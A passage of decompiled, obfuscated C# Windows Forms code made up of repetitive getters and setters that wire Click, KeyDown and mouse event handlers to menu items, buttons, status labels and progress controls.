        ToolStripMenuItem item = this.toolStripMenuItem_86;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_86 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_86;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_394()
    {
        return this.toolStripMenuItem_87;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_395(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_135);
        ToolStripMenuItem item = this.toolStripMenuItem_87;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_87 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_87;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual StatusStrip vmethod_396()
    {
        return this.statusStrip_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_397(StatusStrip statusStrip_11)
    {
        this.statusStrip_2 = statusStrip_11;
    }

    internal virtual ToolStripStatusLabel vmethod_398()
    {
        return this.toolStripStatusLabel_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_399(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_8 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripMenuItem vmethod_4()
    {
        return this.toolStripMenuItem_1;
    }

    internal virtual ToolStripMenuItem vmethod_40()
    {
        return this.toolStripMenuItem_9;
    }

    internal virtual ToolStripStatusLabel vmethod_400()
    {
        return this.toolStripStatusLabel_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_401(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_9 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_402()
    {
        return this.toolStripStatusLabel_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_403(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_10 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_404()
    {
        return this.toolStripStatusLabel_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_405(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_11 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_406()
    {
        return this.toolStripStatusLabel_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_407(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_12 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripProgressBar vmethod_408()
    {
        return this.toolStripProgressBar_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_409(ToolStripProgressBar toolStripProgressBar_8)
    {
        this.toolStripProgressBar_1 = toolStripProgressBar_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_41(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_30);
        ToolStripMenuItem item = this.toolStripMenuItem_9;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_9 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_9;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_410()
    {
        return this.toolStripMenuItem_88;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_411(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_88 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_412()
    {
        return this.toolStripMenuItem_89;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_413(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_89 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_414()
    {
        return this.toolStripMenuItem_90;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_415(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_136);
        ToolStripMenuItem item = this.toolStripMenuItem_90;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_90 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_90;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual TabPage vmethod_416()
    {
        return this.tabPage_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_417(TabPage tabPage_17)
    {
        this.tabPage_10 = tabPage_17;
    }

    internal virtual GClass7 vmethod_418()
    {
        return this.gclass7_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_419(GClass7 gclass7_13)
    {
        KeyEventHandler handler = new KeyEventHandler(this.method_155);
        GClass7 class2 = this.gclass7_4;
        if (class2 != null)
        {
            class2.KeyDown -= handler;
        }
        this.gclass7_4 = gclass7_13;
        class2 = this.gclass7_4;
        if (class2 != null)
        {
            class2.KeyDown += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_42()
    {
        return this.toolStripMenuItem_10;
    }

    internal virtual ContextMenuStrip vmethod_420()
    {
        return this.contextMenuStrip_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_421(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_8 = contextMenuStrip_14;
    }

    internal virtual ToolStripMenuItem vmethod_422()
    {
        return this.toolStripMenuItem_91;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_423(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_137);
        ToolStripMenuItem item = this.toolStripMenuItem_91;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_91 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_91;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_424()
    {
        return this.toolStripSeparator_18;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_425(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_18 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_426()
    {
        return this.toolStripMenuItem_92;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_427(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_92 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_428()
    {
        return this.toolStripMenuItem_93;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_429(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_140);
        ToolStripMenuItem item = this.toolStripMenuItem_93;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_93 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_93;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_43(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_32);
        ToolStripMenuItem item = this.toolStripMenuItem_10;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_10 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_10;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_430()
    {
        return this.toolStripSeparator_19;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_431(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_19 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_432()
    {
        return this.toolStripMenuItem_94;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_433(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_139);
        ToolStripMenuItem item = this.toolStripMenuItem_94;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_94 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_94;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_434()
    {
        return this.toolStripMenuItem_95;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_435(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_141);
        ToolStripMenuItem item = this.toolStripMenuItem_95;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_95 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_95;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_436()
    {
        return this.toolStripSeparator_20;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_437(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_20 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_438()
    {
        return this.toolStripMenuItem_96;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_439(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_142);
        ToolStripMenuItem item = this.toolStripMenuItem_96;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_96 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_96;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_44()
    {
        return this.toolStripSeparator_2;
    }

    internal virtual ToolStripSeparator vmethod_440()
    {
        return this.toolStripSeparator_21;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_441(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_21 = toolStripSeparator_39;
    }

    internal virtual ToolStripSeparator vmethod_442()
    {
        return this.toolStripSeparator_22;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_443(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_22 = toolStripSeparator_39;
    }

    internal virtual ToolStripStatusLabel vmethod_444()
    {
        return this.toolStripStatusLabel_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_445(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_13 = toolStripStatusLabel_40;
    }

    internal virtual Button vmethod_446()
    {
        return this.button_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_447(Button button_9)
    {
        EventHandler handler = new EventHandler(this.method_149);
        Button button = this.button_0;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.button_0 = button_9;
        button = this.button_0;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual Button vmethod_448()
    {
        return this.button_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_449(Button button_9)
    {
        EventHandler handler = new EventHandler(this.method_144);
        Button button = this.button_1;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.button_1 = button_9;
        button = this.button_1;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_45(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_2 = toolStripSeparator_39;
    }

    internal virtual Button vmethod_450()
    {
        return this.button_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_451(Button button_9)
    {
        EventHandler handler = new EventHandler(this.method_145);
        Button button = this.button_2;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.button_2 = button_9;
        button = this.button_2;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual Button vmethod_452()
    {
        return this.button_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_453(Button button_9)
    {
        EventHandler handler = new EventHandler(this.method_146);
        Button button = this.button_3;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.button_3 = button_9;
        button = this.button_3;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual ComboBox vmethod_454()
    {
        return this.comboBox_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_455(ComboBox comboBox_9)
    {
        EventHandler handler = new EventHandler(this.method_150);
        DrawItemEventHandler handler2 = new DrawItemEventHandler(this.method_157);
        MeasureItemEventHandler handler3 = new MeasureItemEventHandler(this.method_158);
        ComboBox box = this.comboBox_7;
        if (box != null)
        {
            box.SelectedIndexChanged -= handler;
            box.DrawItem -= handler2;
            box.MeasureItem -= handler3;
        }
        this.comboBox_7 = comboBox_9;
        box = this.comboBox_7;
        if (box != null)
        {
            box.SelectedIndexChanged += handler;
            box.DrawItem += handler2;
            box.MeasureItem += handler3;
        }
    }

    internal virtual ToolStripMenuItem vmethod_456()
    {
        return this.toolStripMenuItem_97;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_457(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_153);
        ToolStripMenuItem item = this.toolStripMenuItem_97;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_97 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_97;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_458()
    {
        return this.toolStripMenuItem_98;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_459(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_154);
        ToolStripMenuItem item = this.toolStripMenuItem_98;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_98 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_98;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_46()
    {
        return this.toolStripMenuItem_11;
    }

    internal virtual TabPage vmethod_460()
    {
        return this.tabPage_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_461(TabPage tabPage_17)
    {
        this.tabPage_11 = tabPage_17;
    }

    internal virtual Label vmethod_462()
    {
        return this.label_22;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_463(Label label_30)
    {
        this.label_22 = label_30;
    }

    internal virtual PictureBox vmethod_464()
    {
        return this.pictureBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_465(PictureBox pictureBox_7)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_159);
        MouseEventHandler handler2 = new MouseEventHandler(this.method_160);
        MouseEventHandler handler3 = new MouseEventHandler(this.method_164);
        MouseEventHandler handler4 = new MouseEventHandler(this.method_165);
        PictureBox box = this.pictureBox_3;
        if (box != null)
        {
            box.MouseDown -= handler;
            box.MouseMove -= handler2;
            box.MouseUp -= handler3;
            box.MouseWheel -= handler4;
        }
        this.pictureBox_3 = pictureBox_7;
        box = this.pictureBox_3;
        if (box != null)
        {
            box.MouseDown += handler;
            box.MouseMove += handler2;
            box.MouseUp += handler3;
            box.MouseWheel += handler4;
        }
    }

    internal virtual RichTextBox vmethod_466()
    {
        return this.richTextBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_467(RichTextBox richTextBox_5)
    {
        this.richTextBox_3 = richTextBox_5;
    }

    internal virtual StatusStrip vmethod_468()
    {
        return this.statusStrip_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_469(StatusStrip statusStrip_11)
    {
        this.statusStrip_3 = statusStrip_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_47(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_31);
        ToolStripMenuItem item = this.toolStripMenuItem_11;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_11 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_11;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripStatusLabel vmethod_470()
    {
        return this.toolStripStatusLabel_14;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_471(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_14 = toolStripStatusLabel_40;
    }

    internal virtual ZeroitAnidasoCircleProgress vmethod_472()
    {
        return this.zeroitAnidasoCircleProgress_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_473(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
    {
        this.zeroitAnidasoCircleProgress_3 = zeroitAnidasoCircleProgress_8;
    }

    internal virtual ZeroitProgressIndicator vmethod_474()
    {
        return this.zeroitProgressIndicator_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_475(ZeroitProgressIndicator zeroitProgressIndicator_9)
    {
        this.zeroitProgressIndicator_0 = zeroitProgressIndicator_9;
    }

    internal virtual StatusStrip vmethod_476()
    {
        return this.statusStrip_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_477(StatusStrip statusStrip_11)
    {
        this.statusStrip_4 = statusStrip_11;
    }

    internal virtual ToolStripStatusLabel vmethod_478()
    {
        return this.toolStripStatusLabel_15;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_479(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_15 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripMenuItem vmethod_48()
    {
        return this.toolStripMenuItem_12;
    }

    internal virtual ToolStripStatusLabel vmethod_480()
    {
        return this.toolStripStatusLabel_16;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_481(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_16 = toolStripStatusLabel_40;
    }

    internal virtual StatusStrip vmethod_482()
    {
        return this.statusStrip_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_483(StatusStrip statusStrip_11)
    {
        this.statusStrip_5 = statusStrip_11;
    }

    internal virtual ToolStripStatusLabel vmethod_484()
    {
        return this.toolStripStatusLabel_17;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_485(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_17 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_486()
    {
        return this.toolStripStatusLabel_18;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_487(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_18 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_488()
    {
        return this.toolStripStatusLabel_19;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_489(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_19 = toolStripStatusLabel_40;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_49(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_12 = toolStripMenuItem_136;
    }

    internal virtual ToolStripStatusLabel vmethod_490()
    {
        return this.toolStripStatusLabel_20;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_491(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_20 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripProgressBar vmethod_492()
    {
        return this.toolStripProgressBar_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_493(ToolStripProgressBar toolStripProgressBar_8)
    {
        this.toolStripProgressBar_2 = toolStripProgressBar_8;
    }

    internal virtual StatusStrip vmethod_494()
    {
        return this.statusStrip_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_495(StatusStrip statusStrip_11)
    {
        this.statusStrip_6 = statusStrip_11;
    }

    internal virtual ToolStripStatusLabel vmethod_496()
    {
        return this.toolStripStatusLabel_21;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_497(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_21 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_498()
    {
        return this.toolStripStatusLabel_22;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_499(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_22 = toolStripStatusLabel_40;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_27);
        ToolStripMenuItem item = this.toolStripMenuItem_1;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_1 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_1;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_50()
    {
        return this.toolStripMenuItem_13;
    }

    internal virtual ToolStripStatusLabel vmethod_500()
    {
        return this.toolStripStatusLabel_23;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_501(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_23 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_502()
    {
        return this.toolStripStatusLabel_24;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_503(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_24 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_504()
    {
        return this.toolStripStatusLabel_25;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_505(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_25 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripProgressBar vmethod_506()
    {
        return this.toolStripProgressBar_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_507(ToolStripProgressBar toolStripProgressBar_8)
    {
        this.toolStripProgressBar_3 = toolStripProgressBar_8;
    }

    internal virtual ZeroitProgressIndicator vmethod_508()
    {
        return this.zeroitProgressIndicator_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_509(ZeroitProgressIndicator zeroitProgressIndicator_9)
    {
        this.zeroitProgressIndicator_1 = zeroitProgressIndicator_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_51(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_13 = toolStripMenuItem_136;
    }

    internal virtual RichTextBox vmethod_510()
    {
        return this.richTextBox_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_511(RichTextBox richTextBox_5)
    {
        KeyEventHandler handler = new KeyEventHandler(this.method_253);
        RichTextBox box = this.richTextBox_4;
        if (box != null)
        {
            box.KeyDown -= handler;
        }
        this.richTextBox_4 = richTextBox_5;
        box = this.richTextBox_4;
        if (box != null)
        {
            box.KeyDown += handler;
        }
    }

    internal virtual ZeroitProgressIndicator vmethod_512()
    {
        return this.zeroitProgressIndicator_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_513(ZeroitProgressIndicator zeroitProgressIndicator_9)
    {
        this.zeroitProgressIndicator_2 = zeroitProgressIndicator_9;
    }

    internal virtual Label vmethod_514()
    {
        return this.label_23;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_515(Label label_30)
    {
        this.label_23 = label_30;
    }

    internal virtual Label vmethod_516()
    {
        return this.label_24;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_517(Label label_30)
    {
        this.label_24 = label_30;
    }

    internal virtual Button vmethod_518()
    {
        return this.button_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_519(Button button_9)
    {
        EventHandler handler = new EventHandler(this.method_161);
        Button button = this.button_4;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.button_4 = button_9;
        button = this.button_4;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_52()
    {
        return this.toolStripMenuItem_14;
    }

    internal virtual TabPage vmethod_520()
    {
        return this.tabPage_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_521(TabPage tabPage_17)
    {
        this.tabPage_12 = tabPage_17;
    }

    internal virtual ToolStripMenuItem vmethod_522()
    {
        return this.toolStripMenuItem_99;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_523(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_171);
        ToolStripMenuItem item = this.toolStripMenuItem_99;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_99 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_99;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ContextMenuStrip vmethod_524()
    {
        return this.contextMenuStrip_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_525(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_9 = contextMenuStrip_14;
    }

    internal virtual ToolStripMenuItem vmethod_526()
    {
        return this.toolStripMenuItem_100;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_527(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_172);
        ToolStripMenuItem item = this.toolStripMenuItem_100;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_100 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_100;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_528()
    {
        return this.toolStripSeparator_23;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_529(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_23 = toolStripSeparator_39;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_53(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_33);
        ToolStripMenuItem item = this.toolStripMenuItem_14;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_14 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_14;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_530()
    {
        return this.toolStripMenuItem_101;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_531(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_101 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_532()
    {
        return this.toolStripMenuItem_102;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_533(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_173);
        ToolStripMenuItem item = this.toolStripMenuItem_102;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_102 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_102;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_534()
    {
        return this.toolStripSeparator_24;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_535(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_24 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_536()
    {
        return this.toolStripMenuItem_103;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_537(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_174);
        ToolStripMenuItem item = this.toolStripMenuItem_103;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_103 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_103;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_538()
    {
        return this.toolStripSeparator_25;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_539(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_25 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_54()
    {
        return this.toolStripMenuItem_15;
    }

    internal virtual StatusStrip vmethod_540()
    {
        return this.statusStrip_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_541(StatusStrip statusStrip_11)
    {
        this.statusStrip_7 = statusStrip_11;
    }

    internal virtual ToolStripStatusLabel vmethod_542()
    {
        return this.toolStripStatusLabel_26;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_543(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_26 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripProgressBar vmethod_544()
    {
